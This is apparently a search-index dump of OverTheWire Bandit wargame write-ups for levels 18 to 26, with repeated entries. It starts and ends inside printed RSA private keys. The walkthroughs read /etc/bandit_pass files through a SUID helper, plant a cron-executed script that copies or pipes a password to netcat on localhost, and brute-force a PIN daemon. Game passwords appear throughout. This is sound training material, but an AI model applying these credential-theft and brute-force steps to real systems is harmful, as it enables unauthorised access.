8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM 77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3 vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY = -----END RSA PRIVATE KEY----- closed Copy this private key to a file and chmod 600 to use for next user.","title":"Objective 2"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2018/","text":"Level 18 Objectives SSH to bandit17 using the SSH private key from level 17. Find the difference between passwords.old and passwords.new resulting in the password from passwords.new . Objective 1 Username: bandit17 Password: ssh-private-key Port: 2220 IP/Hostname: bandit.labs.overthewire.org user@localhost:~$ ssh -p 2220 bandit17@bandit.labs.overthewire.org -i bandit17.rsa Success! Objective 2 To find the difference between the files, all we need to use is the diff command. bandit17@bandit:~$ diff passwords.new passwords.old 42c42 < kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd --- > hlbSBPAWJmL6WFDb06gpTx1pPButblOA To interpret this, the diff command uses < and > to indicate which file it came from, based on how you ran the command. For example, the first file, or the file on the left in my command was the passwords.new file, so the arrow < indicates that the kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd is what changed in that file, while in the passwords.old , the hlbSBPAWJmL6WFDb06gpTx1pPButblOA changed. The goal was to find what changed in the passwords.new file, so the password is kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd .","title":"Level 18"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2018/#level-18","text":"","title":"Level 18"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2018/#objectives","text":"SSH to bandit17 using the SSH private key from level 17. Find the difference between passwords.old and passwords.new resulting in the password from passwords.new .","title":"Objectives"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2018/#objective-1","text":"Username: bandit17 Password: ssh-private-key Port: 2220 IP/Hostname: bandit.labs.overthewire.org user@localhost:~$ ssh -p 2220 bandit17@bandit.labs.overthewire.org -i bandit17.rsa Success!","title":"Objective 1"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2018/#objective-2","text":"To find the difference between the files, all we need to use is the diff command. bandit17@bandit:~$ diff passwords.new passwords.old 42c42 < kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd --- > hlbSBPAWJmL6WFDb06gpTx1pPButblOA To interpret this, the diff command uses < and > to indicate which file it came from, based on how you ran the command. For example, the first file, or the file on the left in my command was the passwords.new file, so the arrow < indicates that the kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd is what changed in that file, while in the passwords.old , the hlbSBPAWJmL6WFDb06gpTx1pPButblOA changed. The goal was to find what changed in the passwords.new file, so the password is kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd .","title":"Objective 2"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2019/","text":"Level 19 Objectives SSH to bandit18 Read the password from file readme Objective 1 Username: bandit18 Password: kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd Port: 2220 IP/Hostname: bandit.labs.overthewire.org user@localhost:~$ ssh -p 2220 bandit18@bandit.labs.overthewire.org Successfully connected, but disconnected immediately. Objective 2 After we determined that the password was indeed the correct password from the last level, we now need to deal with a .bashrc that disconnects us immediately when we connect with SSH. We know that the file is name readme in the home directory, so let's read that file by using SSH to send commands for us. user@localhost:~$ ssh -p 2220 bandit18@bandit.labs.overthewire.org 'cat readme' This is a OverTheWire game server. More information on http://www.overthewire.org/wargames bandit18@bandit.labs.overthewire.org's password: IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x","title":"Level 19"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2019/#level-19","text":"","title":"Level 19"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2019/#objectives","text":"SSH to bandit18 Read the password from file readme","title":"Objectives"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2019/#objective-1","text":"Username: bandit18 Password: kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd Port: 2220 IP/Hostname: bandit.labs.overthewire.org user@localhost:~$ ssh -p 2220 bandit18@bandit.labs.overthewire.org Successfully connected, but disconnected immediately.","title":"Objective 1"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2019/#objective-2","text":"After we determined that the password was indeed the correct password from the last level, we now need to deal with a .bashrc that disconnects us immediately when we connect with SSH. We know that the file is name readme in the home directory, so let's read that file by using SSH to send commands for us. user@localhost:~$ ssh -p 2220 bandit18@bandit.labs.overthewire.org 'cat readme' This is a OverTheWire game server. More information on http://www.overthewire.org/wargames bandit18@bandit.labs.overthewire.org's password: IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x","title":"Objective 2"},{"location":"Write-Ups/OverTheWire/Bandit/Level%202/","text":"Level 2 Objectives SSH into the new user Read the password file name - in the home directory Objective 1 We need to SSH into bandit1 with the password we just obtained. Username: bandit1 Password: boJ9jbbUNNfktd78OOpsqOltutMc3MY1 Port: 2220 IP/Hostname: bandit.labs.overthewire.org user@localhost:~$ ssh -p 2220 bandit1@bandit.labs.overthewire.org Success! Objective 2 An ls will show is the file is there. Doing a cat - won't work, as it will be intepreted for flags, so the process will just hang. A nifty trick to list files in a directory, sort of like tree is to do find . , which will find all the files in your current directory ( . ). bandit1@bandit:~$ find . . ./.bash_logout ./.profile ./.bashrc ./- Now let's read the file. bandit1@bandit:~$ cat ./- CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9","title":"Level 2"},{"location":"Write-Ups/OverTheWire/Bandit/Level%202/#level-2","text":"","title":"Level 2"},{"location":"Write-Ups/OverTheWire/Bandit/Level%202/#objectives","text":"SSH into the new user Read the password file name - in the home directory","title":"Objectives"},{"location":"Write-Ups/OverTheWire/Bandit/Level%202/#objective-1","text":"We need to SSH into bandit1 with the password we just obtained. Username: bandit1 Password: boJ9jbbUNNfktd78OOpsqOltutMc3MY1 Port: 2220 IP/Hostname: bandit.labs.overthewire.org user@localhost:~$ ssh -p 2220 bandit1@bandit.labs.overthewire.org Success!","title":"Objective 1"},{"location":"Write-Ups/OverTheWire/Bandit/Level%202/#objective-2","text":"An ls will show is the file is there. Doing a cat - won't work, as it will be intepreted for flags, so the process will just hang. A nifty trick to list files in a directory, sort of like tree is to do find . , which will find all the files in your current directory ( . ). bandit1@bandit:~$ find . . ./.bash_logout ./.profile ./.bashrc ./- Now let's read the file. bandit1@bandit:~$ cat ./- CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9","title":"Objective 2"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2020/","text":"Level 20 Objectives SSH to bandit19 Use the SUID binary in the homedirectory to get the password from /etc/bandit_pass Objective 1 Username: bandit19 Password: IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x Port: 2220 IP/Hostname: bandit.labs.overthewire.org user@localhost:~$ ssh -p 2220 bandit19@bandit.labs.overthewire.org Success! Objective 2 We need to find out how to use the binary. They tell us to run the binary without arguments to learn what it does. bandit19@bandit:~$ ./bandit20-do Run a command as another user. Example: ./bandit20-do id So all we need to do is run the binary (which should run as bandit20 ) to try to read /etc/bandit_pass/bandit20 . bandit19@bandit:~$ ./bandit20-do cat /etc/bandit_pass/bandit20 GbKksEFF4yrVs6il55v6gwY5aVje5f0j","title":"Level 20"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2020/#level-20","text":"","title":"Level 20"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2020/#objectives","text":"SSH to bandit19 Use the SUID binary in the homedirectory to get the password from /etc/bandit_pass","title":"Objectives"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2020/#objective-1","text":"Username: bandit19 Password: IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x Port: 2220 IP/Hostname: bandit.labs.overthewire.org user@localhost:~$ ssh -p 2220 bandit19@bandit.labs.overthewire.org Success!","title":"Objective 1"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2020/#objective-2","text":"We need to find out how to use the binary. They tell us to run the binary without arguments to learn what it does. bandit19@bandit:~$ ./bandit20-do Run a command as another user. Example: ./bandit20-do id So all we need to do is run the binary (which should run as bandit20 ) to try to read /etc/bandit_pass/bandit20 . bandit19@bandit:~$ ./bandit20-do cat /etc/bandit_pass/bandit20 GbKksEFF4yrVs6il55v6gwY5aVje5f0j","title":"Objective 2"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2021/","text":"Level 21 Objectives SSH to bandit20 Use the SUID binary to recieve the password for bandit21 Objective 1 Username: bandit20 Password: GbKksEFF4yrVs6il55v6gwY5aVje5f0j Port: 2220 IP/Hostname: bandit.labs.overthewire.org user@localhost:~$ ssh -p 2220 bandit20@bandit.labs.overthewire.org Success! Objective 2 Testing the output of the SUID binary in the home directory. bandit20@bandit:~$ ./suconnect Usage: ./suconnect <portnumber> This program will connect to the given port on localhost using TCP. If it receives the correct password from the other side, the next password is transmitted back. It appears that we have to control both ends of the connection, so we need to have a nc open for the suconnect binary to connect and give us the password with. Connect with another session: user@localhost:~$ ssh -p 2220 bandit20@bandit.labs.overthewire.org Now that you're in, you need to start a nc server with the password to get the new password. bandit20@bandit:~$ echo \"GbKksEFF4yrVs6il55v6gwY5aVje5f0j\" | nc -nvlp 9001 listening on [ any ] 9001 ... Now us the SUID binary to make the connection. bandit20@bandit:~$ ./suconnect 9001 Read: GbKksEFF4yrVs6il55v6gwY5aVje5f0j Password matches, sending next password bandit20@bandit:~$ echo \"GbKksEFF4yrVs6il55v6gwY5aVje5f0j\" | nc -nvlp 9001 listening on [ any ] 9001 ... connect to [ 127 .0.0.1 ] from ( UNKNOWN ) [ 127 .0.0.1 ] 35764 gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr","title":"Level 21"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2021/#level-21","text":"","title":"Level 21"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2021/#objectives","text":"SSH to bandit20 Use the SUID binary to recieve the password for bandit21","title":"Objectives"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2021/#objective-1","text":"Username: bandit20 Password: GbKksEFF4yrVs6il55v6gwY5aVje5f0j Port: 2220 IP/Hostname: bandit.labs.overthewire.org user@localhost:~$ ssh -p 2220 bandit20@bandit.labs.overthewire.org Success!","title":"Objective 1"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2021/#objective-2","text":"Testing the output of the SUID binary in the home directory. bandit20@bandit:~$ ./suconnect Usage: ./suconnect <portnumber> This program will connect to the given port on localhost using TCP. If it receives the correct password from the other side, the next password is transmitted back. It appears that we have to control both ends of the connection, so we need to have a nc open for the suconnect binary to connect and give us the password with. Connect with another session: user@localhost:~$ ssh -p 2220 bandit20@bandit.labs.overthewire.org Now that you're in, you need to start a nc server with the password to get the new password. bandit20@bandit:~$ echo \"GbKksEFF4yrVs6il55v6gwY5aVje5f0j\" | nc -nvlp 9001 listening on [ any ] 9001 ... Now us the SUID binary to make the connection. bandit20@bandit:~$ ./suconnect 9001 Read: GbKksEFF4yrVs6il55v6gwY5aVje5f0j Password matches, sending next password bandit20@bandit:~$ echo \"GbKksEFF4yrVs6il55v6gwY5aVje5f0j\" | nc -nvlp 9001 listening on [ any ] 9001 ... connect to [ 127 .0.0.1 ] from ( UNKNOWN ) [ 127 .0.0.1 ] 35764 gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr","title":"Objective 2"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2022/","text":"Level 22 Objectives SSH to bandit21 Find out what the cronjob is doing Objective 1 Username: bandit21 Password: gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr Port: 2220 IP/Hostname: bandit.labs.overthewire.org user@localhost:~$ ssh -p 2220 bandit21@bandit.labs.overthewire.org Success! Objective 2 Now we need to look at the /etc/cron.d/ directory. bandit21@bandit:~$ ls -latr /etc/cron.d/ total 28 -rw-r--r-- 1 root root 189 Jan 25 2017 atop -rw-r--r-- 1 root root 102 Oct 7 2017 .placeholder -rw-r--r-- 1 root root 120 Oct 16 2018 cronjob_bandit22 -rw-r--r-- 1 root root 122 Oct 16 2018 cronjob_bandit23 -rw-r--r-- 1 root root 120 Oct 16 2018 cronjob_bandit24 drwxr-xr-x 88 root root 4096 Aug 3 2019 .. drwxr-xr-x 2 root root 4096 Dec 4 01 :58 . Now let's see what we can see: bandit21@bandit:~$ cat /etc/cron.d/* PATH = /bin:/usr/bin:/sbin:/usr/sbin # daily restart of atop at midnight 0 0 * * * root if [ -d \"/run/systemd/system\" ] ; then systemctl restart atop ; else /usr/share/atop/atop.daily \\& ; fi @reboot bandit22 /usr/bin/cronjob_bandit22.sh & > /dev/null * * * * * bandit22 /usr/bin/cronjob_bandit22.sh & > /dev/null @reboot bandit23 /usr/bin/cronjob_bandit23.sh & > /dev/null * * * * * bandit23 /usr/bin/cronjob_bandit23.sh & > /dev/null @reboot bandit24 /usr/bin/cronjob_bandit24.sh & > /dev/null * * * * * bandit24 /usr/bin/cronjob_bandit24.sh & > /dev/null Since our next level is bandit22 , let's see what /usr/bin/cronjob_bandit22.sh does. bandit21@bandit:~$ cat /usr/bin/cronjob_bandit22.sh #!/bin/bash chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv Now let's see what's in /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv bandit21@bandit:~$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI","title":"Level 22"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2022/#level-22","text":"","title":"Level 22"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2022/#objectives","text":"SSH to bandit21 Find out what the cronjob is doing","title":"Objectives"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2022/#objective-1","text":"Username: bandit21 Password: gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr Port: 2220 IP/Hostname: bandit.labs.overthewire.org user@localhost:~$ ssh -p 2220 bandit21@bandit.labs.overthewire.org Success!","title":"Objective 1"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2022/#objective-2","text":"Now we need to look at the /etc/cron.d/ directory. bandit21@bandit:~$ ls -latr /etc/cron.d/ total 28 -rw-r--r-- 1 root root 189 Jan 25 2017 atop -rw-r--r-- 1 root root 102 Oct 7 2017 .placeholder -rw-r--r-- 1 root root 120 Oct 16 2018 cronjob_bandit22 -rw-r--r-- 1 root root 122 Oct 16 2018 cronjob_bandit23 -rw-r--r-- 1 root root 120 Oct 16 2018 cronjob_bandit24 drwxr-xr-x 88 root root 4096 Aug 3 2019 .. drwxr-xr-x 2 root root 4096 Dec 4 01 :58 . Now let's see what we can see: bandit21@bandit:~$ cat /etc/cron.d/* PATH = /bin:/usr/bin:/sbin:/usr/sbin # daily restart of atop at midnight 0 0 * * * root if [ -d \"/run/systemd/system\" ] ; then systemctl restart atop ; else /usr/share/atop/atop.daily \\& ; fi @reboot bandit22 /usr/bin/cronjob_bandit22.sh & > /dev/null * * * * * bandit22 /usr/bin/cronjob_bandit22.sh & > /dev/null @reboot bandit23 /usr/bin/cronjob_bandit23.sh & > /dev/null * * * * * bandit23 /usr/bin/cronjob_bandit23.sh & > /dev/null @reboot bandit24 /usr/bin/cronjob_bandit24.sh & > /dev/null * * * * * bandit24 /usr/bin/cronjob_bandit24.sh & > /dev/null Since our next level is bandit22 , let's see what /usr/bin/cronjob_bandit22.sh does. bandit21@bandit:~$ cat /usr/bin/cronjob_bandit22.sh #!/bin/bash chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv Now let's see what's in /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv bandit21@bandit:~$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI","title":"Objective 2"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2023/","text":"Level 23 Objectives SSH to bandit22 Find out what the cronjob is doing Objective 1 Username: bandit22 Password: Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI Port: 2220 IP/Hostname: bandit.labs.overthewire.org user@localhost:~$ ssh -p 2220 bandit22@bandit.labs.overthewire.org Success! Objective 2 Since we saw from the last level what other scripts were running under /etc/cron.d , we know that /usr/bin/cronjob_bandit23.sh is our next target. bandit22@bandit:~$ cat /usr/bin/cronjob_bandit23.sh #!/bin/bash myname = $( whoami ) mytarget = $( echo I am user $myname | md5sum | cut -d ' ' -f 1 ) echo \"Copying passwordfile /etc/bandit_pass/ $myname to /tmp/ $mytarget \" cat /etc/bandit_pass/ $myname > /tmp/ $mytarget We need to see what $mytarget becomes if $myname is bandit23 . Then we need to read the output of that from /tmp/ . bandit22@bandit:~$ echo I am user bandit23 | md5sum | cut -d ' ' -f 1 8ca319486bfbbc3663ea0fbe81326349 bandit22@bandit:~$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349 jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n","title":"Level 23"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2023/#level-23","text":"","title":"Level 23"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2023/#objectives","text":"SSH to bandit22 Find out what the cronjob is doing","title":"Objectives"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2023/#objective-1","text":"Username: bandit22 Password: Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI Port: 2220 IP/Hostname: bandit.labs.overthewire.org user@localhost:~$ ssh -p 2220 bandit22@bandit.labs.overthewire.org Success!","title":"Objective 1"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2023/#objective-2","text":"Since we saw from the last level what other scripts were running under /etc/cron.d , we know that /usr/bin/cronjob_bandit23.sh is our next target. bandit22@bandit:~$ cat /usr/bin/cronjob_bandit23.sh #!/bin/bash myname = $( whoami ) mytarget = $( echo I am user $myname | md5sum | cut -d ' ' -f 1 ) echo \"Copying passwordfile /etc/bandit_pass/ $myname to /tmp/ $mytarget \" cat /etc/bandit_pass/ $myname > /tmp/ $mytarget We need to see what $mytarget becomes if $myname is bandit23 . Then we need to read the output of that from /tmp/ . bandit22@bandit:~$ echo I am user bandit23 | md5sum | cut -d ' ' -f 1 8ca319486bfbbc3663ea0fbe81326349 bandit22@bandit:~$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349 jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n","title":"Objective 2"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2024/","text":"Level 24 Objectives SSH to bandit23 Find out what the cronjob is doing Objective 1 Username: bandit23 Password: jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n Port: 2220 IP/Hostname: bandit.labs.overthewire.org user@localhost:~$ ssh -p 2220 bandit23@bandit.labs.overthewire.org Success! Objective 2 Since we saw from a couple levels ago what other scripts were running under /etc/cron.d , we know that /usr/bin/cronjob_bandit24.sh is our next target. bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh #!/bin/bash myname = $( whoami ) cd /var/spool/ $myname echo \"Executing and deleting all scripts in /var/spool/ $myname :\" for i in * .* ; do if [ \" $i \" ! = \".\" -a \" $i \" ! = \"..\" ] ; then echo \"Handling $i \" timeout -s 9 60 ./ $i rm -f ./ $i fi done This seems like it's going to execute anything in the /var/spool/bandit24 as long as it was not . or .. , to avoid relative directory structure. Let's check to see if we can write to this directory. bandit23@bandit:~$ stat /var/spool/bandit24/ File: /var/spool/bandit24/ Size: 1359872 Blocks: 2664 IO Block: 4096 directory Device: fb01h/64257d Inode: 920097 Links: 29 Access: ( 0773 /drwxrwx-wx ) Uid: ( 0 / root ) Gid: ( 11024 /bandit24 ) Access: 2020 -03-23 20 :10:01.733275317 +0100 Modify: 2020 -03-23 20 :09:01.729319714 +0100 Change: 2020 -03-23 20 :09:01.729319714 +0100 Birth: - Since we can, we need to create a bash script to give us the password. We also need to find a directory that both of us can read and write to. /tmp looks like a good enough place. bandit23@bandit:~$ stat /tmp File: /tmp Size: 313204736 Blocks: 611840 IO Block: 4096 directory Device: fb03h/64259d Inode: 2 Links: 1 Access: ( 3773 /drwxrws-wt ) Uid: ( 0 / root ) Gid: ( 0 / root ) Access: 2020 -03-22 20 :50:51.715668098 +0100 Modify: 2020 -03-23 20 :37:20.932083465 +0100 Change: 2020 -03-23 20 :37:20.932083465 +0100 Birth: - The script is simply this: #!/bin/bash cat /etc/bandit_pass/bandit24 > /tmp/bandit_pass.txt Use a text editor like vim or nano and paste that into it. You'll then need to chmod 777 to assure that bandit24 will be able to execute it. bandit23@bandit:~$ vim -i NONE /var/spool/bandit24/pw.sh bandit23@bandit:~$ chmod 777 /var/spool/bandit24/pw.sh Now wait a little bit and then you'll need to read from the file you just created. bandit23@bandit:~$ cat /tmp/bandit_pass.txt UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ Alternative script: You could also use netcat to send the password to yourself. Create the /var/spool/bandit24/pw.sh script. #!/bin/bash cat /etc/bandit_pass/bandit24 | netcat localhost 9001 bandit23@bandit:~$ chmod 777 /var/spool/bandit24/pw.sh bandit23@bandit:~$ netcat -nvlp 9001 listening on [ any ] 9001 ... connect to [ 127 .0.0.1 ] from ( UNKNOWN ) [ 127 .0.0.1 ] 52118 UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ","title":"Level 24"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2024/#level-24","text":"","title":"Level 24"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2024/#objectives","text":"SSH to bandit23 Find out what the cronjob is doing","title":"Objectives"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2024/#objective-1","text":"Username: bandit23 Password: jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n Port: 2220 IP/Hostname: bandit.labs.overthewire.org user@localhost:~$ ssh -p 2220 bandit23@bandit.labs.overthewire.org Success!","title":"Objective 1"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2024/#objective-2","text":"Since we saw from a couple levels ago what other scripts were running under /etc/cron.d , we know that /usr/bin/cronjob_bandit24.sh is our next target. bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh #!/bin/bash myname = $( whoami ) cd /var/spool/ $myname echo \"Executing and deleting all scripts in /var/spool/ $myname :\" for i in * .* ; do if [ \" $i \" ! = \".\" -a \" $i \" ! = \"..\" ] ; then echo \"Handling $i \" timeout -s 9 60 ./ $i rm -f ./ $i fi done This seems like it's going to execute anything in the /var/spool/bandit24 as long as it was not . or .. , to avoid relative directory structure. Let's check to see if we can write to this directory. bandit23@bandit:~$ stat /var/spool/bandit24/ File: /var/spool/bandit24/ Size: 1359872 Blocks: 2664 IO Block: 4096 directory Device: fb01h/64257d Inode: 920097 Links: 29 Access: ( 0773 /drwxrwx-wx ) Uid: ( 0 / root ) Gid: ( 11024 /bandit24 ) Access: 2020 -03-23 20 :10:01.733275317 +0100 Modify: 2020 -03-23 20 :09:01.729319714 +0100 Change: 2020 -03-23 20 :09:01.729319714 +0100 Birth: - Since we can, we need to create a bash script to give us the password. We also need to find a directory that both of us can read and write to. /tmp looks like a good enough place. bandit23@bandit:~$ stat /tmp File: /tmp Size: 313204736 Blocks: 611840 IO Block: 4096 directory Device: fb03h/64259d Inode: 2 Links: 1 Access: ( 3773 /drwxrws-wt ) Uid: ( 0 / root ) Gid: ( 0 / root ) Access: 2020 -03-22 20 :50:51.715668098 +0100 Modify: 2020 -03-23 20 :37:20.932083465 +0100 Change: 2020 -03-23 20 :37:20.932083465 +0100 Birth: - The script is simply this: #!/bin/bash cat /etc/bandit_pass/bandit24 > /tmp/bandit_pass.txt Use a text editor like vim or nano and paste that into it. You'll then need to chmod 777 to assure that bandit24 will be able to execute it. bandit23@bandit:~$ vim -i NONE /var/spool/bandit24/pw.sh bandit23@bandit:~$ chmod 777 /var/spool/bandit24/pw.sh Now wait a little bit and then you'll need to read from the file you just created. bandit23@bandit:~$ cat /tmp/bandit_pass.txt UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ Alternative script: You could also use netcat to send the password to yourself. Create the /var/spool/bandit24/pw.sh script. #!/bin/bash cat /etc/bandit_pass/bandit24 | netcat localhost 9001 bandit23@bandit:~$ chmod 777 /var/spool/bandit24/pw.sh bandit23@bandit:~$ netcat -nvlp 9001 listening on [ any ] 9001 ... connect to [ 127 .0.0.1 ] from ( UNKNOWN ) [ 127 .0.0.1 ] 52118 UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ","title":"Objective 2"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2025/","text":"Level 25 Objectives SSH to bandit24 Brute force the pin-code daemon listening on 30002 using password as input Objective 1 Username: bandit24 Password: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ Port: 2220 IP/Hostname: bandit.labs.overthewire.org user@localhost:~$ ssh -p 2220 bandit24@bandit.labs.overthewire.org Success! Objective 2 Let's see what we get when we give it a random number. bandit24@bandit:~$ echo \"0000\" | nc localhost 30002 So we need to force a disconnect after each nc . Now we need to make a brute force script. #!/bin/bash PASSWD = 'UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ' LOG = '/tmp/bruter.txt' touch $LOG for j in { 0000 ..5000 } do str1 = \" $PASSWD $j \" echo $str1 done | nc localhost 30002 > $LOG cat $LOG | grep -v Wrong sleep 5 for i in { 5000 ..9999 } do str2 = \" $PASSWD $i \" echo $str2 done | nc 127 .0.0.1 30002 > $LOG grep -v Wrong $LOG Use an editor to make a script in /tmp . bandit24@bandit:~$ nano /tmp/bruteforcepin.sh Unable to create directory /home/bandit24/.nano: Permission denied It is required for saving/loading search history or cursor positions. Press Enter to continue bandit24@bandit:~$ bash /tmp/bruteforcepin.sh I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space. Timeout. Exiting. I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space. Correct! The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG Exiting.","title":"Level 25"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2025/#level-25","text":"","title":"Level 25"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2025/#objectives","text":"SSH to bandit24 Brute force the pin-code daemon listening on 30002 using password as input","title":"Objectives"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2025/#objective-1","text":"Username: bandit24 Password: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ Port: 2220 IP/Hostname: bandit.labs.overthewire.org user@localhost:~$ ssh -p 2220 bandit24@bandit.labs.overthewire.org Success!","title":"Objective 1"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2025/#objective-2","text":"Let's see what we get when we give it a random number. bandit24@bandit:~$ echo \"0000\" | nc localhost 30002 So we need to force a disconnect after each nc . Now we need to make a brute force script. #!/bin/bash PASSWD = 'UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ' LOG = '/tmp/bruter.txt' touch $LOG for j in { 0000 ..5000 } do str1 = \" $PASSWD $j \" echo $str1 done | nc localhost 30002 > $LOG cat $LOG | grep -v Wrong sleep 5 for i in { 5000 ..9999 } do str2 = \" $PASSWD $i \" echo $str2 done | nc 127 .0.0.1 30002 > $LOG grep -v Wrong $LOG Use an editor to make a script in /tmp . bandit24@bandit:~$ nano /tmp/bruteforcepin.sh Unable to create directory /home/bandit24/.nano: Permission denied It is required for saving/loading search history or cursor positions. Press Enter to continue bandit24@bandit:~$ bash /tmp/bruteforcepin.sh I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space. Timeout. Exiting. I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space. Correct! The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG Exiting.","title":"Objective 2"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2026/","text":"Level 26 Objectives SSH to bandit25 Find out how to get to bandit26 Objective 1 Username: bandit25 Password: uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG Port: 2220 IP/Hostname: bandit.labs.overthewire.org user@localhost:~$ ssh -p 2220 bandit25@bandit.labs.overthewire.org Success! Objective 2 Taking a quick look, we find bandit26.sshkey in the home directory. Now just use that to log into bandit26 . bandit25@bandit:~$ ls bandit26.sshkey bandit25@bandit:~$ cat bandit26.sshkey -----BEGIN RSA PRIVATE KEY----- 